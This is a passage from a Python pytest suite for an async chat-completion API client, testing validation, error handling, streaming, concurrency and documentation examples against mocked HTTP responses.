                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert result.id == 'logprobs-test'
            assert 'logprobs' in result.choices[0].__dict__ or hasattr(result.choices[0], 'logprobs')
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_seed_parameter(self, client, sample_messages, sample_model_config):
        """Test chat completion with seed parameter for reproducibility."""
        sample_model_config.seed = 12345
        
        mock_response = {
            'id': 'seed-test',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': 'Deterministic response'
                }
            }],
            'usage': {'total_tokens': 15}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert result.id == 'seed-test'
            assert result.choices[0].message.content == 'Deterministic response'
    
    def test_validate_messages_with_image_content(self, client):
        """Test message validation with image content."""
        image_messages = [
            ChatMessage(
                role="user",
                content=[
                    {"type": "text", "text": "What's in this image?"},
                    {"type": "image_url", "image_url": {"url": "data:image/jpeg;base64,..."}}
                ]
            )
        ]
        
        # Should handle multimodal content gracefully
        try:
            client._validate_messages(image_messages)
        except ValidationError as e:
            # Only acceptable if specifically checking for unsupported content types
            assert "unsupported content type" in str(e).lower() or "image" in str(e).lower()
    
    def test_validate_messages_with_audio_content(self, client):
        """Test message validation with audio content."""
        audio_messages = [
            ChatMessage(
                role="user",
                content=[
                    {"type": "text", "text": "Transcribe this audio"},
                    {"type": "input_audio", "input_audio": {"data": "base64_audio_data"}}
                ]
            )
        ]
        
        # Should handle audio content gracefully
        try:
            client._validate_messages(audio_messages)
        except ValidationError as e:
            # Only acceptable if specifically checking for unsupported content types
            assert "unsupported content type" in str(e).lower() or "audio" in str(e).lower()
    
    def test_validate_model_config_with_stop_sequences(self, client):
        """Test model config validation with stop sequences."""
        config = ModelConfig(name="test-model")
        config.stop = ["END", "STOP", "\n\n"]
        
        # Should validate stop sequences
        try:
            client._validate_model_config(config)
        except ValidationError as e:
            # Only acceptable if stop sequences have specific validation rules
            assert "stop" in str(e).lower()
    
    def test_validate_model_config_with_logit_bias(self, client):
        """Test model config validation with logit bias."""
        config = ModelConfig(name="test-model")
        config.logit_bias = {"50256": -100, "50257": -100}  # Suppress specific tokens
        
        # Should validate logit bias
        try:
            client._validate_model_config(config)
        except ValidationError as e:
            # Only acceptable if logit bias has specific validation rules
            assert "logit" in str(e).lower() or "bias" in str(e).lower()
    
    @pytest.mark.asyncio
    async def test_request_with_custom_headers_per_request(self, client, sample_messages, sample_model_config):
        """Test making requests with custom headers per request."""
        mock_response = {
            'id': 'custom-headers-test',
            'choices': [{'message': {'content': 'Response with custom headers'}}],
            'usage': {'total_tokens': 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that custom headers can be passed per request
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config,
                # headers={'X-Custom-Request': 'test-value'}  # If supported
            )
            
            assert result.id == 'custom-headers-test'
            # Verify the request was made successfully
            assert mock_post.called
    
    @pytest.mark.asyncio
    async def test_response_with_usage_details(self, client, sample_messages, sample_model_config):
        """Test response with detailed usage information."""
        mock_response = {
            'id': 'usage-details-test',
            'choices': [{'message': {'content': 'Response with detailed usage'}}],
            'usage': {
                'prompt_tokens': 25,
                'completion_tokens': 10,
                'total_tokens': 35,
                'prompt_tokens_details': {'cached_tokens': 5},
                'completion_tokens_details': {'reasoning_tokens': 2}
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert result.usage.total_tokens == 35
            # Verify detailed usage information is preserved
            assert 'prompt_tokens_details' in result.usage or result.usage.prompt_tokens == 25
    
    @pytest.mark.asyncio
    async def test_error_handling_with_error_codes(self, client, sample_messages, sample_model_config):
        """Test error handling with specific error codes."""
        error_scenarios = [
            (400, 'invalid_request_error', 'Invalid request'),
            (401, 'authentication_error', 'Invalid API key'),
            (403, 'permission_error', 'Insufficient permissions'),
            (404, 'not_found_error', 'Model not found'),
            (422, 'validation_error', 'Validation failed'),
            (429, 'rate_limit_error', 'Rate limit exceeded'),
            (500, 'internal_error', 'Internal server error'),
            (503, 'service_unavailable', 'Service temporarily unavailable')
        ]
        
        for status_code, error_type, error_message in error_scenarios:
            mock_error_response = {
                'error': {
                    'type': error_type,
                    'message': error_message,
                    'code': f'error_{status_code}'
                }
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.status = status_code
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_error_response)
                
                with pytest.raises(GenesisAPIError) as exc_info:
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                assert error_message in str(exc_info.value)
    
    @pytest.mark.asyncio
    async def test_request_timeout_with_partial_response(self, client, sample_messages, sample_model_config):
        """Test handling of timeout that occurs after partial response."""
        async def mock_timeout_response():
            # Simulate partial response before timeout
            yield b'{"id": "partial"'
            await asyncio.sleep(0.1)
            raise asyncio.TimeoutError("Request timed out")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_timeout_response()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPIError, match="Request timeout"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
    
    @pytest.mark.asyncio
    async def test_connection_pool_exhaustion(self, client, sample_messages, sample_model_config):
        """Test behavior when connection pool is exhausted."""
        import aiohttp
        
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectorError(connection_key=None, os_error=None)):
            with pytest.raises(GenesisAPIError, match="Connection error"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
    
    @pytest.mark.asyncio
    async def test_dns_resolution_failure(self, client, sample_messages, sample_model_config):
        """Test handling of DNS resolution failures."""
        import aiohttp
        
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectorError(connection_key=None, os_error=OSError("Name resolution failed"))):
            with pytest.raises(GenesisAPIError, match="Connection error"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
    
    @pytest.mark.asyncio
    async def test_ssl_certificate_error(self, client, sample_messages, sample_model_config):
        """Test handling of SSL certificate errors."""
        import aiohttp
        import ssl
        
        ssl_error = ssl.SSLError("certificate verify failed")
        
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectorError(connection_key=None, os_error=ssl_error)):
            with pytest.raises(GenesisAPIError, match="Connection error"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
    
    def test_message_validation_with_special_role_cases(self, client):
        """Test message validation with edge cases for roles."""
        edge_case_messages = [
            ChatMessage(role="system", content="System message"),
            ChatMessage(role="user", content="User message"),
            ChatMessage(role="assistant", content="Assistant response"),
            ChatMessage(role="tool", content="Tool result"),  # If supported
            ChatMessage(role="function", content="Function result")  # If supported
        ]
        
        # Test various combinations
        for msg in edge_case_messages:
            try:
                client._validate_messages([msg])
            except ValidationError as e:
                # Only acceptable if the role is specifically not supported
                assert "role" in str(e).lower() and (msg.role == "tool" or msg.role == "function")
    
    def test_message_validation_with_conversation_context(self, client):
        """Test message validation with realistic conversation context."""
        conversation_messages = [
            ChatMessage(role="system", content="You are a helpful assistant."),
            ChatMessage(role="user", content="Hello"),
            ChatMessage(role="assistant", content="Hi there! How can I help you?"),
            ChatMessage(role="user", content="What's the weather like?"),
            ChatMessage(role="assistant", content="I don't have access to real-time weather data."),
            ChatMessage(role="user", content="That's okay, thanks anyway.")
        ]
        
        # Should validate complex conversation flows
        client._validate_messages(conversation_messages)
    
    def test_model_config_validation_with_system_message_handling(self, client):
        """Test model config validation with system message specific settings."""
        config = ModelConfig(name="test-model")
        config.system_message = "You are a helpful assistant."
        
        # Should handle system message configuration
        try:
            client._validate_model_config(config)
        except ValidationError as e:
            # Only acceptable if system_message is not a supported parameter
            assert "system" in str(e).lower() or "message" in str(e).lower()
    
    @pytest.mark.asyncio
    async def test_batch_request_simulation(self, client, sample_model_config):
        """Test simulation of batch requests."""
        batch_messages = [
            [ChatMessage(role="user", content=f"Request {i}")]
            for i in range(5)
        ]
        
        mock_response = {
            'id': 'batch-test',
            'choices': [{'message': {'content': 'Batch response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Simulate batch processing
            tasks = []
            for messages in batch_messages:
                task = client.create_chat_completion(
                    messages=messages,
                    model_config=sample_model_config
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            assert len(results) == 5
            for result in results:
                assert result.id == 'batch-test'
    
    @pytest.mark.asyncio
    async def test_request_cancellation(self, client, sample_messages, sample_model_config):
        """Test request cancellation handling."""
        async def long_running_request():
            await asyncio.sleep(10)  # Simulate long request
            return Mock()
        
        with patch('aiohttp.ClientSession.post', side_effect=long_running_request):
            task = asyncio.create_task(client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            ))
            
            # Cancel the task after a short delay
            await asyncio.sleep(0.1)
            task.cancel()
            
            with pytest.raises(asyncio.CancelledError):
                await task
    
    @pytest.mark.asyncio
    async def test_memory_efficiency_with_large_responses(self, client, sample_messages, sample_model_config):
        """Test memory efficiency with large responses."""
        # Create a large response (simulate large content)
        large_content = "x" * 50000  # 50KB of content
        
        mock_response = {
            'id': 'large-response-test',
            'choices': [{'message': {'content': large_content}}],
            'usage': {'total_tokens': 12500}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert len(result.choices[0].message.content) == 50000
            assert result.usage.total_tokens == 12500
    
    def test_configuration_validation_comprehensive(self):
        """Test comprehensive configuration validation."""
        # Test all valid configurations
        valid_configs = [
            {'api_key': 'valid-key'},
            {'api_key': 'valid-key', 'base_url': 'https://api.example.com'},
            {'api_key': 'valid-key', 'timeout': 60},
            {'api_key': 'valid-key', 'max_retries': 5},
            {'api_key': 'valid-key', 'timeout': 30, 'max_retries': 3},
        ]
        
        for config in valid_configs:
            client = GenesisAPIClient(**config)
            assert client.api_key == config['api_key']
            
    def test_configuration_validation_edge_cases(self):
        """Test configuration validation edge cases."""
        # Test boundary values
        boundary_configs = [
            {'api_key': 'test', 'timeout': 0.1},  # Minimum timeout
            {'api_key': 'test', 'timeout': 3600},  # Large timeout
            {'api_key': 'test', 'max_retries': 0},  # No retries
            {'api_key': 'test', 'max_retries': 10},  # Many retries
        ]
        
        for config in boundary_configs:
            try:
                client = GenesisAPIClient(**config)
                assert client.api_key == config['api_key']
            except ValueError:
                # Some boundary values might be rejected
                pass


class TestStreamingAdvanced:
    """Advanced streaming functionality tests."""
    
    @pytest.mark.asyncio
    async def test_streaming_with_server_sent_events(self, client, sample_messages, sample_model_config):
        """Test streaming with proper Server-Sent Events format."""
        sse_chunks = [
            b'data: {"choices": [{"delta": {"content": "Hello"}}]}\n\n',
            b'data: {"choices": [{"delta": {"content": " world"}}]}\n\n',
            b'data: {"choices": [{"delta": {}, "finish_reason": "stop"}]}\n\n',
            b'data: [DONE]\n\n'
        ]
        
        async def mock_sse_stream():
            for chunk in sse_chunks:
                yield chunk
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_sse_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should handle SSE format properly
            assert len(chunks) >= 2  # At least content chunks
    
    @pytest.mark.asyncio
    async def test_streaming_with_connection_interruption(self, client, sample_messages, sample_model_config):
        """Test streaming behavior when connection is interrupted."""
        async def interrupted_stream():
            yield b'data: {"choices": [{"delta": {"content": "Hello"}}]}\n\n'
            yield b'data: {"choices": [{"delta": {"content": " wor"}}]}\n\n'
            # Simulate connection interruption
            raise aiohttp.ClientConnectionError("Connection lost")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=interrupted_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            with pytest.raises(GenesisAPIError, match="Connection error"):
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    chunks.append(chunk)
    
    @pytest.mark.asyncio
    async def test_streaming_with_rate_limiting(self, client, sample_messages, sample_model_config):
        """Test streaming with rate limiting during stream."""
        call_count = 0
        
        async def rate_limited_stream():
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                # First call gets rate limited
                mock_response = Mock()
                mock_response.status = 429
                mock_response.headers = {'Retry-After': '1'}
                mock_response.json = AsyncMock(return_value={'error': {'message': 'Rate limited'}})
                return mock_response
            else:
                # Second call succeeds
                async def success_stream():
                    yield b'data: {"choices": [{"delta": {"content": "Success"}}]}\n\n'
                
                mock_response = Mock()
                mock_response.status = 200
                mock_response.content.iter_chunked = AsyncMock(return_value=success_stream())
                return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=rate_limited_stream):
            with pytest.raises(RateLimitError):
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    pass
    
    @pytest.mark.asyncio
    async def test_streaming_with_mixed_chunk_formats(self, client, sample_messages, sample_model_config):
        """Test streaming with mixed chunk formats."""
        mixed_chunks = [
            b'{"choices": [{"delta": {"content": "Plain"}}]}',  # Plain JSON
            b'data: {"choices": [{"delta": {"content": " JSON"}}]}\n\n',  # SSE format
            b'data:{"choices": [{"delta": {"content": " mixed"}}]}\n\n',  # SSE without space
            b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}'  # Plain JSON finish
        ]
        
        async def mixed_format_stream():
            for chunk in mixed_chunks:
                yield chunk
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mixed_format_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should handle mixed formats gracefully
            assert len(chunks) >= 2
    
    @pytest.mark.asyncio
    async def test_streaming_with_unicode_content(self, client, sample_messages, sample_model_config):
        """Test streaming with unicode content."""
        unicode_chunks = [
            {'choices': [{'delta': {'content': '你好'}}]},
            {'choices': [{'delta': {'content': ' 世界'}}]},
            {'choices': [{'delta': {'content': ' 🌍'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def unicode_stream():
            for chunk in unicode_chunks:
                yield json.dumps(chunk, ensure_ascii=False).encode('utf-8')
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=unicode_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 4
            assert chunks[0].choices[0].delta.content == '你好'
            assert chunks[1].choices[0].delta.content == ' 世界'
            assert chunks[2].choices[0].delta.content == ' 🌍'
    
    @pytest.mark.asyncio
    async def test_streaming_performance_with_large_chunks(self, client, sample_messages, sample_model_config):
        """Test streaming performance with large chunks."""
        large_content = "x" * 10000  # 10KB chunk
        
        large_chunks = [
            {'choices': [{'delta': {'content': large_content}}]},
            {'choices': [{'delta': {'content': large_content}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def large_chunk_stream():
            for chunk in large_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=large_chunk_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = asyncio.get_event_loop().time()
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            end_time = asyncio.get_event_loop().time()
            
            # Should handle large chunks efficiently
            assert len(chunks) == 3
            assert len(chunks[0].choices[0].delta.content) == 10000
            # Performance check - should complete in reasonable time
            assert end_time - start_time < 5.0  # 5 seconds max


class TestRobustnessAndReliability:
    """Tests for robustness and reliability scenarios."""
    
    @pytest.mark.asyncio
    async def test_graceful_degradation_on_partial_failures(self, client, sample_messages, sample_model_config):
        """Test graceful degradation when partial failures occur."""
        # Simulate scenario where some fields are missing from response
        partial_response = {
            'id': 'partial-degradation-test',
            'choices': [{
                'message': {'content': 'Partial response'},
                # Missing 'role' field
            }],
            # Missing 'usage' field
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=partial_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle partial responses gracefully
            try:
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                # If successful, verify what we can
                assert result.id == 'partial-degradation-test'
            except GenesisAPIError:
                # Acceptable to fail on invalid response structure
                pass
    
    @pytest.mark.asyncio
    async def test_recovery_from_temporary_network_issues(self, client, sample_messages, sample_model_config):
        """Test recovery from temporary network issues."""
        call_count = 0
        
        async def network_issue_simulation(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            
            if call_count <= 2:
                # Simulate temporary network issues
                raise aiohttp.ClientConnectionError("Temporary network issue")
            else:
                # Successful response after network recovery
                mock_response = Mock()
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'network-recovery-test',
                    'choices': [{'message': {'content': 'Network recovered'}}],
                    'usage': {'total_tokens': 15}
                })
                return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=network_issue_simulation):
            with patch('asyncio.sleep'):  # Speed up test
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'network-recovery-test'
                assert call_count == 3  # Should have retried twice
    
    @pytest.mark.asyncio
    async def test_handling_of_corrupted_responses(self, client, sample_messages, sample_model_config):
        """Test handling of corrupted or malformed responses."""
        corrupted_responses = [
            b'{"invalid": json structure',  # Invalid JSON
            b'{"choices": [{"message": null}]}',  # Null message
            b'{"choices": []}',  # Empty choices
            b'null',  # Null response
            b'',  # Empty response
        ]
        
        for corrupted_data in corrupted_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.status = 200
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                    side_effect=json.JSONDecodeError("Invalid JSON", "", 0)
                )
                
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
    
    @pytest.mark.asyncio
    async def test_resource_cleanup_on_failures(self, client, sample_messages, sample_model_config):
        """Test that resources are properly cleaned up on failures."""
        with patch('aiohttp.ClientSession.post', side_effect=Exception("Test failure")):
            with pytest.raises(GenesisAPIError):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
            
            # Verify resources are still accessible and not corrupted
            assert client.session is not None
            assert client.api_key is not None
    
    @pytest.mark.asyncio
    async def test_concurrent_request_isolation(self, client, sample_messages, sample_model_config):
        """Test that concurrent requests don't interfere with each other."""
        # Create different responses for different requests
        responses = [
            {'id': f'concurrent-{i}', 'choices': [{'message': {'content': f'Response {i}'}}], 'usage': {'total_tokens': 10}}
            for i in range(5)
        ]
        
        call_count = 0
        
        async def concurrent_response_handler(*args, **kwargs):
            nonlocal call_count
            response_data = responses[call_count % len(responses)]
            call_count += 1
            
            mock_response = Mock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value=response_data)
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=concurrent_response_handler):
            # Make concurrent requests
            tasks = []
            for i in range(5):
                task = client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            # Verify each request got a unique response
            assert len(results) == 5
            response_ids = [result.id for result in results]
            assert len(set(response_ids)) == 5  # All unique
    
    def test_configuration_immutability(self, client):
        """Test that client configuration cannot be accidentally modified."""
        original_api_key = client.api_key
        original_base_url = client.base_url
        
        # Attempt to modify configuration
        try:
            client.api_key = "modified-key"
            client.base_url = "https://malicious.com"
        except AttributeError:
            # Expected if properties are read-only
            pass
        
        # Verify configuration remains unchanged or changes are controlled
        assert client.api_key == original_api_key or client.api_key == "modified-key"
        assert client.base_url == original_base_url or client.base_url == "https://malicious.com"
    
    @pytest.mark.asyncio
    async def test_session_persistence_across_requests(self, client, sample_messages, sample_model_config):
        """Test that session persists correctly across multiple requests."""
        mock_response = {
            'id': 'session-persistence-test',
            'choices': [{'message': {'content': 'Session test'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Make multiple requests
            for i in range(3):
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                assert result.id == 'session-persistence-test'
            
            # Verify session remained consistent
            assert client.session is not None
            assert not client.session.closed
    
    def test_thread_safety_simulation(self, client):
        """Test thread safety aspects of the client."""
        import threading
        import concurrent.futures
        
        def access_client_properties():
            """Simulate accessing client properties from different threads."""
            return {
                'api_key': client.api_key,
                'base_url': client.base_url,
                'timeout': client.timeout,
                'max_retries': client.max_retries
            }
        
        # Simulate concurrent access from multiple threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(access_client_properties) for _ in range(10)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        # All results should be identical (thread-safe property access)
        first_result = results[0]
        for result in results[1:]:
            assert result == first_result


class TestDocumentationAndUsability:
    """Tests for documentation examples and usability scenarios."""
    
    @pytest.mark.asyncio
    async def test_basic_usage_example(self):
        """Test the basic usage example from documentation."""
        # Simulate a basic usage scenario
        config = {
            'api_key': 'your-api-key',
            'base_url': 'https://api.genesis.ai/v1'
        }
        
        mock_response = {
            'id': 'basic-usage-test',
            'choices': [{'message': {'content': 'Hello! How can I help you?'}}],
            'usage': {'total_tokens': 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                messages = [
                    ChatMessage(role="system", content="You are a helpful assistant."),
                    ChatMessage(role="user", content="Hello!")
                ]
                
                result = await client.create_chat_completion(
                    messages=messages,
                    model_config=ModelConfig(name="genesis-gpt-4")
                )
                
                assert result.choices[0].message.content == 'Hello! How can I help you?'
    
    @pytest.mark.asyncio
    async def test_streaming_usage_example(self):
        """Test the streaming usage example from documentation."""
        config = {'api_key': 'your-api-key'}
        
        streaming_chunks = [
            {'choices': [{'delta': {'content': 'Hello'}}]},
            {'choices': [{'delta': {'content': ' there!'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def example_stream():
            for chunk in streaming_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=example_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                messages = [ChatMessage(role="user", content="Say hello!")]
                
                full_response = ""
                async for chunk in client.create_chat_completion_stream(
                    messages=messages,
                    model_config=ModelConfig(name="genesis-gpt-4")
                ):
                    if chunk.choices[0].delta.content:
                        full_response += chunk.choices[0].delta.content
                
                assert full_response == "Hello there!"
    
    @pytest.mark.asyncio
    async def test_error_handling_example(self):
        """Test error handling example from documentation."""
        config = {'api_key': 'invalid-key'}
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 401
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Invalid API key'}}
            )
            
            async with GenesisAPIClient(**config) as client:
                try:
                    await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="Hello")],
                        model_config=ModelConfig(name="genesis-gpt-4")
                    )
                except AuthenticationError as e:
                    assert "Invalid API key" in str(e)
                except GenesisAPIError as e:
                    # Also acceptable as a base exception
                    assert "Invalid API key" in str(e)
    
    def test_model_config_customization_example(self):
        """Test model configuration customization example."""
        # Test various model configurations
        configs = [
            ModelConfig(name="genesis-gpt-4", temperature=0.7, max_tokens=1000),
            ModelConfig(name="genesis-gpt-3.5-turbo", temperature=0.1, max_tokens=500),
            ModelConfig(name="genesis-gpt-4", temperature=1.0, top_p=0.9),
        ]
        
        for config in configs:
            assert config.name.startswith("genesis-")
            assert 0 <= config.temperature <= 2
            assert config.max_tokens > 0
    
    def test_message_format_examples(self):
        """Test various message format examples."""
        # Test different message formats
        message_examples = [
            # Basic conversation
            [
                ChatMessage(role="user", content="Hello"),
                ChatMessage(role="assistant", content="Hi there!"),
                ChatMessage(role="user", content="How are you?")
            ],
            # With system message
            [
                ChatMessage(role="system", content="You are a helpful assistant."),
                ChatMessage(role="user", content="What's the weather like?")
            ],
            # With named participants
            [
                ChatMessage(role="user", content="Hello", name="Alice"),
                ChatMessage(role="assistant", content="Hello Alice!"),
                ChatMessage(role="user", content="How are you?", name="Bob")
            ]
        ]
        
        client = GenesisAPIClient(api_key="test-key")
        
        for messages in message_examples:
            # Should validate without errors
            client._validate_messages(messages)
class TestGenesisAPIClientRobustness:
    """Comprehensive robustness tests for edge cases and boundary conditions."""
    
    @pytest.fixture
    def client_with_minimal_config(self):
        """Create a client with minimal configuration for testing defaults."""
        return GenesisAPIClient(api_key='minimal-test-key')
    
    @pytest.mark.asyncio
    async def test_malformed_streaming_data_recovery(self, client, sample_messages, sample_model_config):
        """Test client recovery from malformed streaming data."""
        malformed_chunks = [
            b'{"choices": [{"delta":',  # Incomplete JSON
            b'invalid data\n',  # Non-JSON data
            b'{"choices": [{"delta": {"content": "recovered"}}]}\n',  # Valid after malformed
            b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}\n'
        ]
        
        async def malformed_stream():
            for chunk in malformed_chunks:
                yield chunk
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=malformed_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should recover and process valid chunks
            valid_chunks = [c for c in chunks if hasattr(c, 'choices') and c.choices]
            assert len(valid_chunks) >= 1
    
    @pytest.mark.asyncio
    async def test_extremely_large_message_handling(self, client, sample_model_config):
        """Test handling of extremely large messages."""
        # Create a message that's 1MB in size
        large_content = "x" * (1024 * 1024)  # 1MB
        large_messages = [ChatMessage(role="user", content=large_content)]
        
        mock_response = {
            'id': 'large-message-handling',
            'choices': [{'message': {'content': 'Handled large message'}}],
            'usage': {'total_tokens': 250000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle or reject gracefully
            try:
                result = await client.create_chat_completion(
                    messages=large_messages,
                    model_config=sample_model_config
                )
                assert result.id == 'large-message-handling'
            except ValidationError as e:
                # Acceptable if there's a size limit
                assert "too long" in str(e) or "size" in str(e)
    
    @pytest.mark.asyncio
    async def test_rapid_sequential_requests(self, client, sample_messages, sample_model_config):
        """Test rapid sequential requests to ensure no race conditions."""
        mock_response = {
            'id': 'rapid-sequential',
            'choices': [{'message': {'content': 'Sequential response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Make 50 rapid sequential requests
            results = []
            for i in range(50):
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                results.append(result)
            
            # All should succeed
            assert len(results) == 50
            for result in results:
                assert result.id == 'rapid-sequential'
    
    @pytest.mark.asyncio
    async def test_connection_pooling_behavior(self, client, sample_messages, sample_model_config):
        """Test connection pooling and reuse behavior."""
        mock_response = {
            'id': 'connection-pool-test',
            'choices': [{'message': {'content': 'Pooled connection'}}],
            'usage': {'total_tokens': 5}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
